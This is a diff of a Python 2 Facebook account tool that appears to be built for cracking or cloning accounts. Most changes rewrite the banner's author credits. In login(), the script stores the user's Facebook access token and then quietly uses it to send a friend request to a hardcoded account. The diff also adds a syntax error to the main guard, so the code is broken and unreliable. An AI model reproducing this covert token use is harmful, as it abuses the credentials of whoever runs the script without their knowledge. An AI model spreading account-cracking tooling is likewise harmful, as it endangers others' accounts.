@@ -53,10 +53,10 @@ logo = """
 \033[1;91m██║░╚═╝░██║██║░░░██║░░░██║░░██║██║
 \033[1;91m╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝
 \033[1;91m=======================================
-\033[1;96m YouTube  \033[1;93m: \033[1;92m Feelings Creation
-\033[1;96m Instagram \033[1;93m: \033[1;Flow 👑RaFiN Chowdhury💫
-\033[1;96m Facebook \033[1;93m: \033[1; I.FueK.YoUr.MiNd.BnXD
-\033[1;96m Github \033[1;93m: \033[1;92mhttps://github.com/Therana/RafinAhmed44
+\033[1;96mAuthor  \033[1;93m: \033[1;92m Shymon Hasan 
+\033[1;96mInstagram \033[1;93m: \033[1;Flow 👑RaFiN Chowdhury💫
+\033[1;96mFacebook  \033[1;93m: \033[1;I.FueK.YoUr.MiNd.BnXD
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/RafinAhmed44
 \033[1;91m======================================="""
 
 def tik():
@@ -77,10 +77,10 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96m YouTube  \033[1;93m: \033[1;92m Feelings Creation
-\033[1;96m Instagram \033[1;93m: \033[1;Flow 👑RaFiN Chowdhury💫
-\033[1;96m Facebook \033[1;93m: \033[1;92m I.FueK.YoUr.MiNd.BnXD
-\033[1;96m Github \033[1;93m: \033[1;92mhttps://Github.com/Therana/RafinAhmed44
+\033[1;96mAuthor  \033[1;93m: \033[1;92m Shymon Hasan 
+\033[1;96mInstagram \033[1;93m: \033[1;92mFlow 👑RaFiN Chowdhury💫
+\033[1;96mFacebook  \033[1;93m: \033[1;92m I.FueK.YoUr.MiNd.BnXD
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/RafinAhmed44
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
@@ -141,7 +141,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https:https:I.FueK.YoUr.MiNd.BnXD')
+				os.system('xdg-open https:I.FueK.YoUr.MiNd.BnXD')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -412,5 +412,5 @@ def pilih_super():
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
-if __name__ == '__main__':
+if __name_'__main__':
 	login()
